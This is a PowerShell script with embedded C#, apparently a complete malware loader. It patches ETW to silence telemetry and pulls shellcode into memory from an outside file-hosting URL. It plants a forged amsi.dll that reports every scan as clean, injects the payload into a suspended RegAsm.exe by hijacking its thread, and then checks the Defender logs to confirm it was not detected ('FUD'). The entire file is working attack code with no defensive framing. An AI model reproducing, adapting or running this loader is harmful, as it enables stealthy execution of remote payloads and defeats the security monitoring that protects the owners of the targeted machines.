$scriptStart = Get-Date
$ErrorActionPreference = "Stop"
$sw = [System.Diagnostics.Stopwatch]::StartNew()

function V {
    param($m, $c = "Cyan")
    Write-Host ("[{0,7:N2}s] {1}" -f $sw.Elapsed.TotalSeconds, $m) -ForegroundColor $c
}

$src = @'
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

public struct STARTUPINFO
{
    public uint cb;
    public string lpReserved;
    public string lpDesktop;
    public string lpTitle;
    public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    public short wShowWindow, cbReserved2;
    public IntPtr lpReserved2;
    public IntPtr hStdInput, hStdOutput, hStdError;
}

public struct PROCESS_INFORMATION
{
    public IntPtr hProcess;
    public IntPtr hThread;
    public uint dwProcessId;
    public uint dwThreadId;
}

public static class ETW
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
    private static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
    private static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(IntPtr addr, uint size, uint prot, out uint old);

    public static IntPtr Address;
    public static byte[] Before = new byte[4];
    public static byte[] After = new byte[] { 0x48, 0x33, 0xC0, 0xC3 };

    public static bool Patch()
    {
        IntPtr ntdll = GetModuleHandleA("ntdll.dll");
        Address = GetProcAddress(ntdll, "EtwEventWrite");
        Marshal.Copy(Address, Before, 0, 4);
        if (Before[0] == 0x48 && Before[1] == 0x33 && Before[2] == 0xC0 && Before[3] == 0xC3) return false;
        uint old;
        VirtualProtect(Address, 4, 0x04, out old);
        Marshal.Copy(After, 0, Address, 4);
        VirtualProtect(Address, 4, old, out old);
        return true;
    }
}

public static class Loader
{
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessW(string app, string cmdLine, IntPtr pa, IntPtr ta, bool inherit, uint flags, IntPtr env, string curDir, ref STARTUPINFO si, out PROCESS_INFORMATION pi);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr addr, IntPtr size, uint type, uint prot);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtectEx(IntPtr h, IntPtr addr, IntPtr size, uint prot, out uint old);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr written);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, IntPtr size, out IntPtr read);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint ResumeThread(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint SuspendThread(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetThreadContext(IntPtr h, IntPtr ctx);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetThreadContext(IntPtr h, IntPtr ctx);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern uint WaitForSingleObject(IntPtr h, uint ms);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr h);
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
    private static extern IntPtr GetModuleHandleA(string name);
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi, ExactSpelling = true)]
    private static extern IntPtr GetProcAddress(IntPtr h, string name);
    [DllImport("ntdll.dll")]
    private static extern int NtQueryInformationProcess(IntPtr h, int cls, byte[] info, int len, out int ret);

    public static uint Pid, Tid;
    public static IntPtr HProc, HThread;
    public static ulong PayloadVA, StageVA, ImageBase;
    public static int ScanBufRVA;

    public static bool Spawn(string exe, string cmdLine)
    {
        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));
        PROCESS_INFORMATION pi;
        if (!CreateProcessW(exe, cmdLine, IntPtr.Zero, IntPtr.Zero, false, 0x08000000 | 0x4, IntPtr.Zero, null, ref si, out pi)) return false;
        HProc = pi.hProcess; HThread = pi.hThread;
        Pid = pi.dwProcessId; Tid = pi.dwThreadId;
        return true;
    }

    private static ulong AllocRWX(int size)
    {
        return (ulong)VirtualAllocEx(HProc, IntPtr.Zero, (IntPtr)size, 0x3000, 0x40).ToInt64();
    }

    public static ulong Read8(ulong addr)
    {
        byte[] b = new byte[8]; IntPtr r;
        if (!ReadProcessMemory(HProc, (IntPtr)(long)addr, b, (IntPtr)8, out r)) return 0;
        return BitConverter.ToUInt64(b, 0);
    }

    public static ushort Read16(ulong addr)
    {
        byte[] b = new byte[2]; IntPtr r;
        if (!ReadProcessMemory(HProc, (IntPtr)(long)addr, b, (IntPtr)2, out r)) return 0;
        return BitConverter.ToUInt16(b, 0);
    }

    public static byte[] ReadBytes(ulong addr, int n)
    {
        byte[] b = new byte[n]; IntPtr r;
        if (!ReadProcessMemory(HProc, (IntPtr)(long)addr, b, (IntPtr)n, out r)) return null;
        return b;
    }

    public static bool Write(ulong addr, byte[] data)
    {
        IntPtr w;
        return WriteProcessMemory(HProc, (IntPtr)(long)addr, data, (IntPtr)data.Length, out w);
    }

    public static ulong GetPeb()
    {
        byte[] b = new byte[48]; int ret;
        NtQueryInformationProcess(HProc, 0, b, 48, out ret);
        return BitConverter.ToUInt64(b, 8);
    }

    public static ulong FindModule(string name)
    {
        ulong peb = GetPeb(); if (peb == 0) return 0;
        ulong ldr = Read8(peb + 0x18); if (ldr == 0) return 0;
        ulong head = ldr + 0x10;
        ulong cur = Read8(head);
        for (int i = 0; i < 512 && cur != 0 && cur != head; i++)
        {
            ulong dllBase = Read8(cur + 0x30);
            ushort len = Read16(cur + 0x58);
            if (len > 0 && len < 520)
            {
                ulong buf = Read8(cur + 0x60);
                byte[] nb = ReadBytes(buf, (int)len);
                if (nb != null)
                {
                    string s = Encoding.Unicode.GetString(nb);
                    if (string.Equals(s, name, StringComparison.OrdinalIgnoreCase)) return dllBase;
                }
            }
            cur = Read8(cur);
        }
        return 0;
    }

    private static void Add64(List<byte> b, ulong v)
    {
        b.AddRange(BitConverter.GetBytes(v));
    }

    private static byte[] BuildStageDecoy(ulong ldrAddr, ulong uniAddr, ulong handleAddr, ulong payloadAddr, ulong markerAddr)
    {
        List<byte> b = new List<byte>();
        b.AddRange(new byte[] { 0x48, 0x83, 0xE4, 0xF0 });   // and rsp, -16
        b.AddRange(new byte[] { 0x48, 0x83, 0xEC, 0x20 });   // sub rsp, 20h (shadow)
        b.AddRange(new byte[] { 0x31, 0xC9 });               // xor ecx, ecx
        b.AddRange(new byte[] { 0x31, 0xD2 });               // xor edx, edx
        b.AddRange(new byte[] { 0x49, 0xB8 }); Add64(b, uniAddr);    // mov r8, uni
        b.AddRange(new byte[] { 0x49, 0xB9 }); Add64(b, handleAddr); // mov r9, handle
        b.AddRange(new byte[] { 0x49, 0xBA }); Add64(b, markerAddr); // mov r10, marker
        b.AddRange(new byte[] { 0x41, 0xC6, 0x02, 0x77 });           // mov byte [r10], 0x77
        b.AddRange(new byte[] { 0x48, 0xB8 }); Add64(b, ldrAddr);    // mov rax, ldr
        b.AddRange(new byte[] { 0xFF, 0xD0 });               // call rax
        b.AddRange(new byte[] { 0x48, 0x83, 0xC4, 0x20 });   // add rsp, 20h
        b.AddRange(new byte[] { 0x49, 0xBA }); Add64(b, markerAddr); // mov r10, marker
        b.AddRange(new byte[] { 0x41, 0x89, 0x42, 0x04 });           // mov dword [r10+4], eax (status)
        b.AddRange(new byte[] { 0x41, 0xC6, 0x02, 0x88 });           // mov byte [r10], 0x88
        b.AddRange(new byte[] { 0x49, 0xBA }); Add64(b, handleAddr); // mov r10, handle
        b.AddRange(new byte[] { 0x49, 0x83, 0x3A, 0x00 });   // cmp qword ptr [r10], 0
        int jePos = b.Count;
        b.Add(0x74); b.Add(0x00);                            // je spin (patched)
        b.AddRange(new byte[] { 0x48, 0xB8 }); Add64(b, payloadAddr); // mov rax, payload
        b.AddRange(new byte[] { 0xFF, 0xE0 });               // jmp rax
        int spinPos = b.Count;
        b.Add(0xEB); b.Add(0xFE);                            // spin: jmp spin
        b[jePos + 1] = (byte)(spinPos - (jePos + 2));
        return b.ToArray();
    }

    public static int Prepare(byte[] payload, string fakePath)
    {
        PayloadVA = AllocRWX(payload.Length);
        if (PayloadVA == 0) return 1;
        if (!Write(PayloadVA, payload)) return 2;

        StageVA = AllocRWX(0x1000);
        if (StageVA == 0) return 3;

        ulong peb = GetPeb(); if (peb == 0) return 4;
        byte[] ib = ReadBytes(peb + 0x10, 8); if (ib == null) return 5;
        ImageBase = BitConverter.ToUInt64(ib, 0);

        ulong ntdll = (ulong)GetModuleHandleA("ntdll.dll").ToInt64();
        byte[] mz = ReadBytes(ntdll, 2);
        if (mz == null || mz[0] != 0x4D || mz[1] != 0x5A) return 6;

        IntPtr ownLdr = GetProcAddress(GetModuleHandleA("ntdll.dll"), "LdrLoadDll");
        if (ownLdr == IntPtr.Zero) return 7;
        ulong ldrAddr = ntdll + (ulong)(ownLdr.ToInt64() - (long)ntdll);

        byte[] pb = Encoding.Unicode.GetBytes(fakePath);
        ulong uniAddr = StageVA + 0x300;
        ulong handleAddr = StageVA + 0x320;
        ulong pathAddr = StageVA + 0x340;
        ulong markerAddr = StageVA + 0x3F0;
        byte[] stage = new byte[0x1000];
        byte[] code = BuildStageDecoy(ldrAddr, uniAddr, handleAddr, PayloadVA, markerAddr);
        Array.Copy(code, 0, stage, 0, code.Length);
        ushort plen = (ushort)pb.Length;
        stage[0x300] = (byte)(plen & 0xFF); stage[0x301] = (byte)(plen >> 8);
        ushort pmax = (ushort)(plen + 2);
        stage[0x302] = (byte)(pmax & 0xFF); stage[0x303] = (byte)(pmax >> 8);
        Array.Copy(BitConverter.GetBytes(pathAddr), 0, stage, 0x308, 8);
        Array.Copy(pb, 0, stage, 0x340, pb.Length);
        if (!Write(StageVA, stage)) return 8;
        return 0;
    }

    public static bool HijackNow()
    {
        IntPtr buf = Marshal.AllocHGlobal(1232);
        try
        {
            Marshal.WriteInt32(buf, 48, 0x100003);
            if (!GetThreadContext(HThread, buf)) return false;
            Marshal.WriteInt64(buf, 248, (long)StageVA);
            if (!SetThreadContext(HThread, buf)) return false;
        }
        finally { Marshal.FreeHGlobal(buf); }
        return ResumeThread(HThread) != 0xFFFFFFFF;
    }

    public static bool RunCatch(out int polls, out string where)
    {
        polls = 0; where = "";
        if (ResumeThread(HThread) == 0xFFFFFFFF) return false;
        ulong ntdll = (ulong)GetModuleHandleA("ntdll.dll").ToInt64();
        ulong ntdllEnd = ntdll + 0x600000;
        ulong exeEnd = ImageBase + 0x200000;
        long t0 = Environment.TickCount;
        bool mseSeen = false;
        IntPtr buf = Marshal.AllocHGlobal(1232);
        try
        {
            while ((Environment.TickCount - t0) < 3000)
            {
                if (WaitForSingleObject(HProc, 0) == 0) return false;
                System.Threading.Thread.Sleep(1);
                polls++;
                if (!mseSeen)
                {
                    if (FindModule("mscoree.dll") != 0) mseSeen = true;
                    else continue;
                }
                if (SuspendThread(HThread) == 0xFFFFFFFF) return false;
                bool done = false;
                Marshal.WriteInt32(buf, 48, 0x100003);
                if (GetThreadContext(HThread, buf))
                {
                    ulong rip = (ulong)Marshal.ReadInt64(buf, 248);
                    if (rip >= 0x10000 && !(rip >= ntdll && rip < ntdllEnd) && !(rip >= ImageBase && rip < exeEnd))
                    {
                        where = "0x" + rip.ToString("X");
                        Marshal.WriteInt64(buf, 248, (long)StageVA);
                        done = SetThreadContext(HThread, buf);
                    }
                }
                if (done)
                {
                    if (ResumeThread(HThread) == 0xFFFFFFFF) return false;
                    return true;
                }
                ResumeThread(HThread);
            }
        }
        finally { Marshal.FreeHGlobal(buf); }
        return false;
    }

    public static void Cleanup() { CloseHandle(HThread); CloseHandle(HProc); }

    public static byte[] BuildFakeAmsi()
    {
        byte[] f = new byte[0x600];
        f[0] = 0x4D; f[1] = 0x5A;
        Put32(f, 0x3C, 0x40);
        f[0x40] = 0x50; f[0x41] = 0x45;
        Put16(f, 0x44, 0x8664);
        Put16(f, 0x46, 2);
        Put16(f, 0x54, 0xF0);
        Put16(f, 0x56, 0x2022);

        int oh = 0x58;
        Put16(f, oh + 0, 0x20B);
        Put32(f, oh + 4, 0x200);
        Put32(f, oh + 8, 0x200);
        Put32(f, oh + 16, 0x1000);
        Put32(f, oh + 20, 0x1000);
        Put64(f, oh + 24, 0x180000000L);
        Put32(f, oh + 32, 0x1000);
        Put32(f, oh + 36, 0x200);
        Put16(f, oh + 40, 6);
        Put16(f, oh + 48, 6);
        Put32(f, oh + 56, 0x3000);
        Put32(f, oh + 60, 0x200);
        Put16(f, oh + 68, 3);
        Put16(f, oh + 70, 0x0140);
        Put64(f, oh + 72, 0x100000);
        Put64(f, oh + 80, 0x1000);
        Put64(f, oh + 88, 0x100000);
        Put64(f, oh + 96, 0x1000);
        Put32(f, oh + 108, 16);
        Put32(f, oh + 112, 0x1050);
        Put32(f, oh + 116, 0x200);
        Put32(f, oh + 112 + 40, 0x2000);
        Put32(f, oh + 112 + 44, 0x0C);

        int sh = oh + 0xF0;
        byte[] tname = Encoding.ASCII.GetBytes(".text");
        for (int i = 0; i < 8; i++) f[sh + i] = i < tname.Length ? tname[i] : (byte)0;
        Put32(f, sh + 8, 0x200);
        Put32(f, sh + 12, 0x1000);
        Put32(f, sh + 16, 0x200);
        Put32(f, sh + 20, 0x200);
        Put32(f, sh + 36, 0x60000020);

        int sh2 = sh + 40;
        byte[] rname = Encoding.ASCII.GetBytes(".reloc");
        for (int i = 0; i < 8; i++) f[sh2 + i] = i < rname.Length ? rname[i] : (byte)0;
        Put32(f, sh2 + 8, 0x0C);
        Put32(f, sh2 + 12, 0x2000);
        Put32(f, sh2 + 16, 0x200);
        Put32(f, sh2 + 20, 0x400);
        Put32(f, sh2 + 36, 0x42000040);

        List<byte> tx = new List<byte>();
        int rvaDllMain = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0xB8, 1, 0, 0, 0, 0xC3 });
        int rvaClose = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x31, 0xC0, 0xC3 });
        int rvaInit = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x48, 0xC7, 0x02, 1, 0, 0, 0, 0x31, 0xC0, 0xC3 });
        int rvaNotify = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x31, 0xC0, 0xC3 });
        int rvaOpen = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x31, 0xC0, 0xC3 });
        int rvaScanBuf = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, 0x30, 0x48, 0x85, 0xC0, 0x74, 0x06, 0xC7, 0x00, 0, 0, 0, 0, 0x31, 0xC0, 0xC3 });
        int rvaScanStr = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x48, 0x8B, 0x44, 0x24, 0x28, 0x48, 0x85, 0xC0, 0x74, 0x06, 0xC7, 0x00, 0, 0, 0, 0, 0x31, 0xC0, 0xC3 });
        int rvaUninit = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0x31, 0xC0, 0xC3 });
        int rvaCanUnload = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0xB8, 1, 0, 0, 0, 0xC3 });
        int rvaGetClass = 0x1000 + tx.Count; tx.AddRange(new byte[] { 0xB8, 1, 0x40, 0, 0x80, 0xC3 });
        ScanBufRVA = rvaScanBuf;

        while ((tx.Count % 4) != 0) tx.Add(0xCC);
        int rvaExpDir = 0x1000 + tx.Count; tx.AddRange(new byte[40]);
        int rvaFuncs = 0x1000 + tx.Count; tx.AddRange(new byte[36]);
        int rvaNames = 0x1000 + tx.Count; tx.AddRange(new byte[36]);
        int rvaOrds = 0x1000 + tx.Count; tx.AddRange(new byte[18]);
        while ((tx.Count % 4) != 0) tx.Add(0xCC);

        string[] names = new string[] { "AmsiCloseSession", "AmsiInitialize", "AmsiNotifyOperation", "AmsiOpenSession", "AmsiScanBuffer", "AmsiScanString", "AmsiUninitialize", "DllCanUnloadNow", "DllGetClassObject" };
        int[] funcs = new int[] { rvaClose, rvaInit, rvaNotify, rvaOpen, rvaScanBuf, rvaScanStr, rvaUninit, rvaCanUnload, rvaGetClass };
        int[] nameRVAs = new int[9];
        for (int i = 0; i < 9; i++)
        {
            nameRVAs[i] = 0x1000 + tx.Count;
            byte[] nb = Encoding.ASCII.GetBytes(names[i]);
            tx.AddRange(nb);
            tx.Add(0);
        }
        int rvaDllName = 0x1000 + tx.Count;
        tx.AddRange(Encoding.ASCII.GetBytes("amsi.dll"));
        tx.Add(0);

        byte[] t = tx.ToArray();
        Put32(t, (rvaExpDir - 0x1000) + 12, rvaDllName);
        Put32(t, (rvaExpDir - 0x1000) + 16, 1);
        Put32(t, (rvaExpDir - 0x1000) + 20, 9);
        Put32(t, (rvaExpDir - 0x1000) + 24, 9);
        Put32(t, (rvaExpDir - 0x1000) + 28, rvaFuncs);
        Put32(t, (rvaExpDir - 0x1000) + 32, rvaNames);
        Put32(t, (rvaExpDir - 0x1000) + 36, rvaOrds);
        for (int i = 0; i < 9; i++)
        {
            Put32(t, (rvaFuncs - 0x1000) + i * 4, funcs[i]);
            Put32(t, (rvaNames - 0x1000) + i * 4, nameRVAs[i]);
            Put16(t, (rvaOrds - 0x1000) + i * 2, i);
        }
        Array.Copy(t, 0, f, 0x200, t.Length);

        Put32(f, oh + 16, rvaDllMain);
        Put32(f, oh + 112, rvaExpDir);
        Put32(f, oh + 116, 0x200);
        Put32(f, oh + 112 + 40, 0x2000);
        Put32(f, oh + 112 + 44, 0x0C);

        int rl = 0x400;
        Put32(f, rl + 0, 0x1000);
        Put32(f, rl + 4, 0x0C);
        return f;
    }

    private static void Put16(byte[] a, int off, int v)
    {
        a[off] = (byte)(v & 0xFF);
        a[off + 1] = (byte)((v >> 8) & 0xFF);
    }

    private static void Put32(byte[] a, int off, int v)
    {
        a[off] = (byte)(v & 0xFF);
        a[off + 1] = (byte)((v >> 8) & 0xFF);
        a[off + 2] = (byte)((v >> 16) & 0xFF);
        a[off + 3] = (byte)((v >> 24) & 0xFF);
    }

    private static void Put64(byte[] a, int off, long v)
    {
        for (int i = 0; i < 8; i++) a[off + i] = (byte)((v >> (8 * i)) & 0xFF);
    }
}
'@
Add-Type -TypeDefinition $src

V "== loader :: etw patch -> mem fetch -> decoy amsi preload -> post-init hijack ==" Magenta

if (-not [Environment]::Is64BitProcess) {
    V "need 64-bit powershell - aborting" Red
    exit 1
}
V "arch check ok - x64 powershell" Green

V "[1/5] patching ETW in the loader process..." Yellow
$patched = [ETW]::Patch()
$beforeHex = ([ETW]::Before | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
if ($patched) {
    V "ntdll!EtwEventWrite @ 0x$('{0:X}' -f [ETW]::Address.ToInt64())  ( $beforeHex ) -> 48 33 C0 C3  ( xor rax, rax ; ret )" Green
    V "telemetry from this process is now muted" DarkCyan
} else {
    V "ntdll!EtwEventWrite @ 0x$('{0:X}' -f [ETW]::Address.ToInt64()) already patched - skipping" DarkYellow
}

V "[2/5] fetching shellcode into memory..." Yellow
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$url = "https://files.catbox.moe/nfasiv.bin"
$wc = New-Object System.Net.WebClient
$wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
$wc.Proxy = [Net.WebRequest]::GetSystemWebProxy()
$wc.Proxy.Credentials = [Net.CredentialCache]::DefaultCredentials
V "GET $url" Gray
$sc = $wc.DownloadData($url)
$wc.Dispose()
if ($sc.Length -eq 0) { V "empty response - aborting" Red; exit 1 }
if ($sc[0] -eq 0x3C) { V "got HTML back ( 404? ) instead of shellcode - aborting" Red; exit 1 }
$prevN = [Math]::Min(8, $sc.Length)
$prev = ($sc[0..($prevN - 1)] | ForEach-Object { '{0:X2}' -f $_ }) -join ' '
V "pulled $($sc.Length) bytes into memory ( no disk touch ) - head: $prev" Green

V "[3/5] forging decoy amsi.dll..." Yellow
$fakeBytes = [Loader]::BuildFakeAmsi()
$fakePath = Join-Path $env:TEMP "amsi.dll"
[IO.File]::WriteAllBytes($fakePath, $fakeBytes)
V "decoy written: $fakePath  ($($fakeBytes.Length) bytes, 9 exports, clean scan result)" Green

$hijacked = $false
for ($attempt = 1; $attempt -le 3 -and -not $hijacked; $attempt++) {
    V "[4/5] spawning RegAsm x64 suspended ( attempt $attempt )..." Yellow
    $regasm = Join-Path $env:windir "Microsoft.NET\Framework64\v4.0.30319\RegAsm.exe"
    if (-not (Test-Path -LiteralPath $regasm)) { V "RegAsm not found at $regasm - aborting" Red; exit 1 }
    $cmd = '"' + $regasm + '" ngsp.local.dll'
    $ok = [Loader]::Spawn($regasm, $cmd)
    if (-not $ok) { V "CreateProcessW failed ( $([Runtime.InteropServices.Marshal]::GetLastWin32Error()) ) - aborting" Red; exit 1 }
    V "RegAsm.exe up - PID $([Loader]::Pid)  main TID $([Loader]::Tid)  ( suspended )" Green

    $rc = [Loader]::Prepare($sc, $fakePath)
    if ($rc -ne 0) { V "prepare failed at step $rc - aborting" Red; exit 1 }
    V "payload 0x$('{0:X}' -f [Loader]::PayloadVA)   stage0 0x$('{0:X}' -f [Loader]::StageVA)   decoy path @ stage+0x340" DarkCyan

    if ($attempt -le 2) {
        V "[5/5] hijack at initial suspend - ntdll finishes loader init, then RIP -> stage0 ( clean env )..." Yellow
        [void][Loader]::HijackNow()
        for ($i = 0; $i -lt 60; $i++) {
            Start-Sleep -Milliseconds 50
            $p = Get-Process -Id ([Loader]::Pid) -ErrorAction SilentlyContinue
            if ($null -eq $p -or $p.HasExited) { break }
            $hnd = [Loader]::ReadBytes([Loader]::StageVA + 0x320, 8)
            if ($hnd -and [BitConverter]::ToInt64($hnd, 0) -ne 0) { $hijacked = $true; break }
        }
        if ($hijacked) {
            V "stage0 ran on clean env - decoy amsi.dll loaded ( handle 0x$('{0:X}' -f [BitConverter]::ToInt64($hnd, 0)) )" Green
        }
    } else {
        V "[5/5] fallback path - post-init catch..." Yellow
        $polls = 0; $where = ""
        $hijacked = [Loader]::RunCatch([ref]$polls, [ref]$where)
        if ($hijacked) {
            V "caught thread at $where after $polls polls - RIP -> stage0" Green
        }
    }

    if (-not $hijacked) {
        $p = Get-Process -Id ([Loader]::Pid) -ErrorAction SilentlyContinue
        if ($null -eq $p -or $p.HasExited) { V "attempt failed ( target exited ) - retrying" DarkYellow }
        else { V "attempt failed - retrying" DarkYellow; Stop-Process -Id ([Loader]::Pid) -Force }
        [Loader]::Cleanup()
        Start-Sleep -Milliseconds 250
    }
}
if (-not $hijacked) { V "all attempts failed" Red; exit 1 }

Start-Sleep -Seconds 2
$p = Get-Process -Id ([Loader]::Pid) -ErrorAction SilentlyContinue
$alive = $null -ne $p -and -not $p.HasExited
if ($alive) { V "RegAsm alive - payload running" Green } else { V "RegAsm exited" Red }

$mod = [Loader]::FindModule("amsi.dll")
if ($mod -ne 0) {
    $bytes = [Loader]::ReadBytes($mod + [uint64][Loader]::ScanBufRVA, 8)
    $hex2 = if ($bytes) { ($bytes | ForEach-Object { '{0:X2}' -f $_ }) -join ' ' } else { "?" }
    V "decoy amsi.dll mapped in target @ 0x$('{0:X}' -f $mod)   AmsiScanBuffer now: $hex2" Green
    if ($hex2 -ne "48 8B 44 24 30 48 85 C0") {
        V "decoy absorbed the AMSI patch - the real amsi.dll was never touched" Magenta
    } else {
        V "decoy found but not yet patched ( payload may patch later )" DarkYellow
    }
} else {
    V "decoy amsi.dll not found in module list" DarkYellow
}

Start-Sleep -Seconds 3
$evs = @(Get-WinEvent -FilterHashtable @{LogName = 'Microsoft-Windows-Windows Defender/Operational'; StartTime = $scriptStart } -ErrorAction SilentlyContinue |
    Where-Object { $_.Message -match 'AMSI_Patch' -or $_.Message -match ("pid:" + [Loader]::Pid + ":") })
if ($evs.Count -eq 0) {
    V "defender check: no AMSI_Patch / behavior events fired for this run - FUD" Green
} else {
    V "defender check: $($evs.Count) event(s) fired for this run:" Red
    foreach ($ev in ($evs | Select-Object -First 4)) {
        V ("  [" + $ev.Id + "] " + (($ev.Message -replace "`r`n", ' ') -replace '^(.{0,150}).*$', '$1')) DarkRed
    }
}

try { Remove-Item -LiteralPath $fakePath -Force -ErrorAction Stop; V "decoy file deleted from disk ( module stays mapped )" DarkCyan } catch { }

[Loader]::Cleanup()
V "== done. love you, be safe out there ==" Magenta
